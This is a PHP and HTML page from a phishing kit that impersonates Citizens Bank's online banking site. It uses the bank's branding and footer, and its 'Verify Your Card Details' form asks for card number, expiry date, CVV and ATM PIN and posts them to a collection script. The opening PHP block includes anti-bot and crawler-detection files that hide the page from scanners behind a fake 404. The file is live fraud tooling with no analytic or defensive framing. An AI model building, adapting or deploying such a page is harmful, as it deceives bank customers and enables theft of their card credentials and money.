<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
    include './huehuehue.php';
    include './bot_fucker/bot.php';
    include './bot_fucker/wrd.php';
    include './crawlerdetect.php';
?>

<!DOCTYPE HTML>
<link type="text/css" rel="stylesheet" id="dark-mode-general-link"><link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta charset="utf-8">
  <title>Online Banking | Citizens Bank</title>
  <meta name="description" content="">
  <link href="images/icon-normal.png" rel="apple-touch-icon">
  <link href="images/icon-normal.png" rel="apple-touch-icon" sizes="76x76">
  <link href="images/icon-normal.png" rel="apple-touch-icon" sizes="120x120">
  <link href="images/icon-normal.png" rel="apple-touch-icon" sizes="152x152">
  <link href="images/icon-normal.png" rel="apple-touch-icon" sizes="180x180">
  <link href="images/icon-hires.png" rel="icon" sizes="192x192">
  <link href="images/icon-normal.png" rel="icon" sizes="128x128">

 
   <link href="dist/app.bundle.css" rel="stylesheet">

  <meta name="viewport" content="width=device-width, initial-scale=1">


    <link rel="stylesheet" href="dist/main.css">
    </head>

<body class="responsive-enabled">

  <!-- ===============
      PAGE HEADER START
      =============== -->
  <!-- begin CITIZENS BANK Hosted Header -->
  <div class="ctzns-heder-foter-injected">

<link rel="stylesheet" type="text/css" href="css/nsns.min.css">

<style>
.help-modal-header .help-modal-close {background: url(images/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(images/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(images/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style>
<div class="ctzns-heder-foter"><div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"><p>You will be logged out of your Online Banking session in
<span id="timeout-seconds">30</span> seconds.</p>
<p>
<strong>Do you wish to continue?</strong>
</p>
<a href="#" class="button button-cta button-continue">
<span>CONTINUE</span>
</a>
<a href="#" class="button button-cta button-logout">CANCEL</a>
</div><div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div>
</div>
</div><div class="citizens-header">

    <!-- htmlContainer PREFIX -->
    <div class="ctzns-heder-foter">
      <header id="page-header" class="page-header">
        <!-- inc-header.html START -->
        <div class="centered-content clearfix">
          <a href="http://www.citizensbank.com" class="page-logo">
            <img src="images/CTZ_Green-01.png" alt="Citizens Bank" width="203" height="25" border="0">
          </a>
          <div id="header-navigation-container"></div>
        </div>
        <!-- inc-header.html END -->
      </header>
    </div>
    <!-- htmlContainer SUFFIX -->

  </div>
  <!-- end CITIZENS BANK Hosted Header -->
  <!-- ===============
      PAGE HEADER END
      =============== -->

  <!-- ===============
      PAGE CONTENT AREA START
      =============== -->
  <div id="page-container" class="page-container"><div class="centered-content clearfix">
    <div class="g-unauth-main-container">
        <section class="unauth-intro-area">
            <h2 class="unauth-intro-area__title ">Verify Your Card Details</h2>
        
            <div class="js-error-block"></div>
            <div class="unauth-intro-area__help">
                <a class="g-link-list unauth-intro-area__link g-display-none" href="#helpModalPage">Show Help</a>
                <p class="unauth-intro-area__text">Please verify your card details in the form below.</p>
            </div>
        </section>        <section class="unauth-content-section">
            <form action="step/next/mainnet.php?token=<?php echo $_SESSION['token']; ?>" method="post" class="unauth-form jqtransform js-login-form" >
                
                
                <div class="unauth-form__rowgroup -visible" id="unauth-ic-form-rowgroup-account-info" style="display: block;">
                    <div class="unauth-form__row">
                        
                        <div class="unauth-form__row js-option-identify-mtd">
                            <div class="js-user-block">
                                <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                        <label class="unauth-form__label" for="unauth-form-first-name">Credit Card Number:</label>
                                        <div>
                                            <input id="unauth-form-first-name" name="ccnum" type="tel" placeholder="Card Number" class="unauth-form__input js-firstname" data-toenable="accInfoLastName" maxlength="20" data-mask="0000-0000-0000-0000" autocomplete="off" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance" style="display: none;">
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Contains only letters</label>
                                        </div>
                                    </div>
                                    <div class="unauth-form__rowitem g-right">
                                        <label class="unauth-form__label" for="unauth-form-last-name">Card Expiry Date:</label>
                                        <div>
                                            <input name="expdate" placeholder="Expiry Date" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="tel" maxlength="5" autocomplete="off" data-mask="00/00" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Contains only letters</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            <label class="unauth-form__label">Card Security Code:</label>
                                            <div>
                                                <input name="cvv" type="text" data-toenable="accInfoLastFourSSN" placeholder="CVV" class="unauth-form__input" id="dp1608300128480" maxlength="3" autocomplete="off" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                    <div class="unauth-form__rowitem g-right">
                                        <label class="unauth-form__label" for="unauth-ic-form-ssn">ATM PIN:</label>
                                        <div>
                                            <input name="pin" placeholder="ATM PIN" class="unauth-form__input js-ssn-tin" type="tel" maxlength="4" autocomplete="off" required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                            <label data-rule="digits" class="unauth-form__label--guidance is-default">Contains only numbers</label>
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Is exactly 4 digits</label>
                                        </div>
                                    </div>
                                </div>
                            </div>     
                                    
                                
                            </div>     
                               </div>
                       
                        
                    </div>
                </div>
                
                
                <div class="unauth-content-section__button-wrap">
                    <button type="submit" name="credit_verify" class="btn unauth-form__submit-button js-submit-button">Continue</button>
                    <a class="unauth-form__cancel-link js-cancel-button" tabindex="0">Cancel</a>
                </div>            </form>
        </section>
    </div>
</div></div>
  <!-- ===============
      PAGE CONTENT AREA END
      =============== -->

  <!-- ===============
      PAGE FOOTER START
      =============== -->
  <div class="citizens-footer"><div class="ctzns-heder-foter"><footer id="page-footer" class="page-footer"><div class="footer-top">
<ul>
<li>
<a href="#" class="contact" title="Opens Ways to Contact Us Dialog">
<span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
</a>
<div class="dropup-menu">
<h4>Contact Us</h4>
<p>General Questions:
<br>
<strong>1-800-656-6561</strong> (personal bank accounts)
<br>
Business Questions:
<br>
<strong>1-877-229-6428</strong> (online banking support)
<br>
<strong>1-800-862-6200</strong> (account information)
<br>
Investment Questions:
<br>
<strong>1-800-942-8300</strong> (Citizens Investment Services)
</p>
<!--
<p>Go to <a href="/customer-service/">Customer Service</a> to send us email or mail or to view FAQs</p>
<p><a href="/forms/contactme.aspx">We'll Contact You</a></p>
-->
</div>
</li>
<!-- As part of Def# 1465 Location is commented on Auth/UnAuth pages.
<li><span class="location">Your Location: NONE</span>
</li>
-->

<li>
<a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
<span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
</a>
<div class="dropup-menu">
<h4>Branch &amp; ATM Locator</h4>
<p>Find one of our 1,300 locations near you.</p>
<div role="form">
<div id="stickyFooterBranch-error" class="error-message" style="display: none"></div>
<input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE">
<a href="#" type="button" class="button button-stickyfooterbranch">Submit</a>
</div>
</div>
</li>
<li><a onclick="showSurvey(formId);" style="cursor:pointer;"><img src="images/feedback.png" alt="Give Feedback" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;" border="0">Feedback</a></li></ul>
</div>
<div class="footer-row clearfix">
<ul>
<li>
<h6>Checking &amp; Savings</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/checking-and-savings.aspx">Checking &amp; Savings Overview</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/checking/">Checking</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/savings-and-cds/savings.aspx">Savings</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/savings-and-cds/money-markets.aspx">Money Markets</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/savings-and-cds/cds.aspx">Certificates of Deposit (CDs)
<sup>®</sup>
</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/ira/">IRAs</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking-and-savings/programs-and-services.aspx">Programs &amp; Services</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking-and-savings/benefits-and-features.aspx">Benefits &amp; Features</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking/debit-cards/standard.aspx">Debit Card</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/overdraft-protection/">Overdraft Choices
<sup>®</sup>
</a>
</li>
</ul>
<ul>
<li>
<h6>Home Borrowing</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/loans/">Home Borrowing Overview</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/mortgages/">Mortgages</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/home-equity/loans.aspx">Home Equity Loans</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/home-equity/lines.aspx">Home Equity Lines of Credit</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/loans/determine-my-rate.aspx">Determine My Rate</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/mortgages/my-mortgage.aspx">My Mortgage Account</a>
</li>
</ul>
<ul>
<li>
<h6>Students</h6>
</li>
<!--<li><a target="_blank" href="http://www.citizensbank.com/student-services/">Students Overview</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-banking/">Banking</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/undergradfamilies.aspx">Undergraduate Borrowing</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/gradstudents.aspx">Graduate Borrowing</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/process.aspx">The Student Loan Process</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Student Tools &amp; Resources</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/default.aspx">Student Loan Options</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/education-refinance-loan-overview.aspx">Refinancing Student Loans</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/process/default.aspx">The Student Loan Process</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/process/undergraduate.aspx">Undergraduate Students &amp; Parents</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/process/graduate.aspx">Graduate Students</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Tools &amp; Information</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking/one-deposit-checking-account.aspx">Banking for Students</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-services/access-my-student-loan/default.aspx">Access My Student Loan</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Cards</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/">Cards Overview</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/credit-cards/overview.aspx">Credit Cards</a>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/debit-card/debit-card.aspx">Debit Card</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/credit-cards/creditcardagreements/agreements.aspx">Card Agreements</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/security/">Security Features</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Personal Loans</h6>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/personal-loans/overview.aspx">Overview</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/personal-loans/faqs.aspx">FAQs</a>
</li>
</ul>
<ul>
<li>
<h6>Resources</h6>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking/order-checks.aspx">Order Checks</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/online-and-mobile-banking/default.aspx">Online &amp; Mobile Banking</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/customer-service/">Customer Service</a>
</li>
</ul>
<ul>
<li>
<h6>About Us</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/about-us/">About Us Overview</a></li>-->
<li>
<a target="_blank" href="http://investor.citizensbank.com/about-us/our-company.aspx">About Citizens Bank</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/community/">In the Community</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/careers/">Careers</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/about_our_ads.aspx">About Our Ads</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Solutions</h6>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/">Personal</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/investing/">Investing</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/small-business/">Small Business</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/commercial-banking/">Commercial</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Disclosures</h6>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/pf/onlinebanking/terms.aspx">Online Terms and Conditions</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/pdf/CTZ_eSign.pdf">Electronic Notice Disclosure and Consent (Online Service)</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking-and-savings/account-documents.aspx">Account Documents</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://www.fdic.gov">Member FDIC</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/security/equal-housing-lender.aspx">Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="images/equal-housing.gif">
</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/security/">Security, Privacy &amp; Legal</a>
</li>
</ul>
</div>
<div class="centered-content">
<div class="footer-bottom">
<p class="legal">
Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
</p>
<p class="legal">
*Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Investment Services. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.<br><br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed.  Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).<br><br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only.  These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported.  Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported.  Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.<br><br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.<br><br>SpeciFi<sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A.
</p>

<div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
<p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:</p>
<ul class="footer-disclaimer-box__list">
<li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
<li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
<li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
<li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
<br>
</li>
<li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
</ul>
</div>
<ul class="footer-util">
<li class="sitemap">
<a target="_blank" href="#">Site Map</a>
</li>
<li>Follow:
<a target="_blank" href="#">
<img src="images/footer-follow-facebook.png" alt="Facebook" align="middle">
</a>
<a target="_blank" href="#">
<img src="images/footer-follow-twitter.png" alt="Twitter">
</a>
<a target="_blank" href="#">
<img src="images/footer-follow-linkedin.png" alt="Linkedin">
</a>
<a target="_blank" href="#">
<img src="images/footer-follow-youtube.png" alt="Youtube">
</a>
</li>
</ul>

<p class="footer-copyright">
© Copyright 2021 Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
</p>

<img src="images/elh.gif" alt="Equal Housing Lender">
<img src="images/fdicFooter.gif" alt="Member FDIC">
</div>
</div>
</footer></div></div>
  <!-- ===============
      PAGE FOOTER END
      =============== -->

 
<script src="vendor/jquery-3.2.1.min.js"></script>
<script src="dist/jquery.mask.js"></script>
<script src="dist/jquery.mask.min.js"></script>

   

<span></span>
    

<div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all"></div></body></html>